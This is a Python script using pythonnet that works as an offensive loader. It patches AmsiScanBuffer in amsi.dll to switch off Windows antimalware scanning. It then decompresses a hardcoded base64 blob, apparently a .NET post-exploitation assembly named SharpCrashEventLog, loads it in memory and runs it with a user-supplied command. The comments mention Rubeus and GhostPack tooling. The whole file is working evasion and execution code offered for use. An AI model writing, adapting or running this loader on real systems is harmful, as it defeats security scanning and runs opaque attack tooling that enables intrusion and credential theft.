import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "eJztWH1sHEcVf7tnn52LfYkd13GdNt2c09bxx+X8UdVJ8+XYl8TEid2c46itW3dvb2xvs7d7md1zbRpKWtFChYRaFArlHwr9p1VBqkqlFlqoQCBUQYWgAoGQQv8AIYqgiFYIUCH8Znb37mwf1C1/IEHH3rfz3rx583tv3s3Hnrj1YYoQUQ2ey5eJXiC/HKJ3LxfwxK/5epye2/DqjheU8Vd3TC2YrlbgzjzX85qh27bjaVmm8aKtmbY2OpHR8k6OJRsbYzsDG5NponElQrfft+nF0O7rlKCNSoqoBUy9L9veD6KFwA75ddXHTVR+S1CqX43QoQeINsv/8rv0kuX7fUQTgcl3aqs4eSdRA177oDe0jpiUilaCLks9+GMVfNJjSx7eO5sDv1rKuCtM3JnkLjcowAaMFMXTulIP4kNJzizH8LEKzNLWVWv0Dq+GebnPfx+TXWrppQRCGCdS/KGi63G1skx3biKKuQhxTNOAwWlCrYtoW6qGHiJpt4mDFFw4HoupfAvqnSCxni1Srra2OS3CxBWinaIOnI1trNt6S7ou8F5ELB542Bo8MTzdLVsbLnW1Nly6Dk8Cz3Y87XhaG3k3LG/o3ArF1s42QRsuUX2XwCOToYfS56gVKJRtKZW4b7wpAHelABdv4bOCAcRorLtBreAutWyU9usq7F8a5OeEQjvq0Xu3gXbCYvQ6/pVQyv8a1rRPYJjOq/w4KUFy7tpFLQLPFuCpV0QuA09PQv1Uz3a19fP8oBIA690k2OMh27OR36wEdrvQEuN/VqkQlciiFe50dMJgtLeZb48E2j7u7hi/GEqinfhRRXsa+BuhpHszT9as0I92Ii+j3S3806FcSxUDb4L+v+I/rilZfO/avrw3xhO1oV/b1c6rxftw5kOHFZmpft4vDiZTyYHUQN8eIaklC/QvCHvHvUQ5+PsOno6Mx0173pU/E2TURYzRcTpDbzf460LH0dNjo3jXNBKdh+mOw5aTDXIbppSjV6gtGwTzN2VAZJ4YfVuQjHXBc3WQoBE/32Vb+Cb6k+IjjtKdysFIlF6V9CI1RjbRrJgVeomeV6M0ogi6U9LnJL0g6WOSviZ1niQNfR+UtE7K/0BdoF+OPK3G6JLqRmJ0MeKi9RX1ach/GzkL+oAq6B4SdFTKx0nQFyKCRiXdRRskXB+rH+XN9IR6XB2mMOYX6BHtDvWeEveoFqP74PWkJvhH6Y/qxzELCwHXrn4S3OYdPjep3g5PH5fcI/Ss+jAi91xCcA+2EfDWy1FtGbUpWc+qoj5bkpdoBPMRUQgLDfohu+HzLtDN1CfpHkmHJR2T9GZJb5FUB72CTFk/J+mypF+k70Ta6SnUrwFN0bVi9YL8a/SLyA2gv1NukpJh0IciR+lbdB5RfIW+GjmF1h9CR0hupx/Ra2qWfk4/U08hNgJhkjbC/yRtoS+AbqNvgnbQ90C76ZegA5LeJOmIlB+nX4NmpOQ2SQ36O+hZul5JkkuDSjedIUaPqqPYSe9QFTqk1GJJVKjmQjiDYTlesWeKYsrNZ6WMkxspMftOOLmixQ5Q2pobsZjO04vM9sad+SOmxc5Q3jUcbplZmlrgTM/RmDtmn3IsRmdMO+fc7R4umpYXiEYc2xVv1ylyg53U84wO68bZYkGYkuzpkyMZxhcZl9wZbnps3LQZHS2auWEPv9xs0WM0yrLF+Xk9a7GybMTJT5uuuUI27Losn7WWp0yvqpjrOZbX+dly05TO55l3BKcXdrdT2RD2EUinGXdNx17bCP/mzPki172qzaPMNbhZWNkI3AXTkj1OMUtfkjV3bedJjmkwvGqDFpa5Ob9QtSlf0O3lcsOpou2ZeSblnpk1LdOrbGV5Z5FRZkHnhRGuuwvhTCfZEsTLrsfySX+asYJS2AqjtuADhWCMZBAl2SKX3CqGaaLA7BITGMgwo4iJX05OopdhFnQrzKWyQM8t6gVzoD+Zsyya9M+bQX86oZt2CQybs5ghQkrpJYPJ2NOtjDuUsRgrkEg200BAbI87lsU48nc4lzdt0/UwjQ6npCHomO1Nejy0Omrq87bjeqbhrvYairBeCOyuafZnm/FSu5/KiA5+ZWCRfm45DlIH3kHRJeTlbMbTvaK7FnUgn8jeBWfhqQliL5rcsfOILR1l3kiRc1F1CrPpc0VdTLyoj9ks5IIYj+WgJnhRmhgtYl2xycNe6tA80dYZmpF1AyunRQuouWilgduoF6udRmlaQhujAqQmWm3IhG4RvRcg24t16R6spx8hpSkDPQMtHJqeWHdv0sj/Ow9rB/CegB0xfrqEY1zi0DBqEX3FSC7+dpByfHXfNPDNYQW1oKNjjNU2jmBU0XYmQGhJLidspdfaCvtqQSQEAgari7AiUAgbHFZceBlY2dgr6xZ8UGpFXbnviQxeAkwBwEL1tc5lEQwNx3UXnZdhLAVpIwLXC2m5n4YeC3Lo8oQIGA7lYb+IVgHweuhqxN7VAWE/dFuMk8RErw9t9ZSohlfHw9E7Dx0vCNp/A60n9ebR4q1BoFx/GzZikcpTFVoimW3Z30/eJFExTPkT6OtKrFnpEwcv0v5umda+3zmMISyYUlOgw28Rbw0ji/RfDJJxXiZ0j4zBkuwfjpuUf8rpEN0pOYpdan//o8GXkdDqehLdlHPEV4wPG0Z5CVivDVvmwWpb/8b7gyHOjMQvlplQYy7wcADz449nyOUnJ0fy+9PEf+qniO48HsHh7Oq8F3uu/G0U0Z4r5YorZ6Ygl7lchRf9NAjq63OJY6841BK9vOs3PV3buo89+5lNkY/d/93PUY2mKPURDUsMKk1Ngo0LouJE13yzEEqqNt2yoa6mOd00pjafqCVVjcdrNTVeXw+qxNGDmsYgVuJX1RAM1tapbc0nRDWuRtsidUq8/vkPz0xfOfj6Q/XPHJz9aNNPYnuh3gYrpG5oa8N5EQMqKlhFuTqOG6v/8WO7uCtMqa1nuF446dilTRjHCGw2CvT8S9FWhZqrnA+oVglbS+cc7dtPaVp/qj+FS7JCO/cMGdnBPTfM9Q7mBm/sHbyxv783mxqa6zXYnJ7t7x/qz/YN4XqoUF0fbof4IzqqUHvyZHqqdM7rCQ4r+8UNEnjjLaWmUdMtWPqyOI9uFn20Uos2KKCdz/307eBuiJ2EyMOlw9uy4si94nuTKKcyo5kv7X3s95+90HHy8Zr2t5p3XxZfEmh074w+0zfjzqyNxIyTvWsGB0Smu6xKc7KQy9JbfeUhGsPPZVXK5b5KbnbE4eklJk9N8jDPmDxV+arXknaoupUPyv9gUWWuarjMt+E96X9NrSj+zX+oilyUVcKS/sK/0BffYx4+RGSVb5uoi5/VNBb4WdA0trkMbu0TdBL8GOgR/2stfaPmzX/4dpQVNg8GXA2tvvni9yVl03JbD09/Y1i0xaIryk7Za0pumLY8fOmlU6xfnqn5gfgIBEye3EjtinNk2dKTUidV+hvEYo9lh9plPEbkgSMfbBduYDlR0VaQ4y/DW13qheUkbYFOON6o3LwNiaOwAud6DkKipLBIl+1Ny+3KrbDThy0zVXrE+FuhPyatCF1bHvjKKNczblJu7b5Px6gZ9sblQURYGpFb4bL0yL8tUBWZRk/JY18/MPVLXF0ydmU7/gzm5EFT4DlbirLILOHDRGDPDHwIY2C/b1+OyLmZhK6DkcXdxFsxf+udk0E5JyvtrJ6Z1fMyJPsMy5uQ8Dkrrw3au/ZrwA/ijYofyZsvvrzv4FLe0haD7TCBLTOhMdtwxI1/f+L01JHeoYTmerqd0y3HZvsTy8xNHDzQGGuM7dODzw4aTNju/kSR23tdY4Hldbc3bxrccZ05r9dw8nt1N59c7Etoed0255jrTVeOB2OaVjIW3kdXYBJ/Cc3GRrw/cWJ5uFCwTEN+OEnqhUJit2/B40XXG7PnnHXi6fdHRk83+AIR8JBwXJOBk+UmubmIC/w8c9dpdSBRslJpBzuuURSIx9kiszRL0P0J3R2zF52zjCe0ojlsiHv//sScbrkscEoa2V0FTQh99wrs+3aXggB+3+4wqAcqFsWU/+1c66cPyv9h+Se3pwmI"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("SharpCrashEventLog.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str]([command])
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()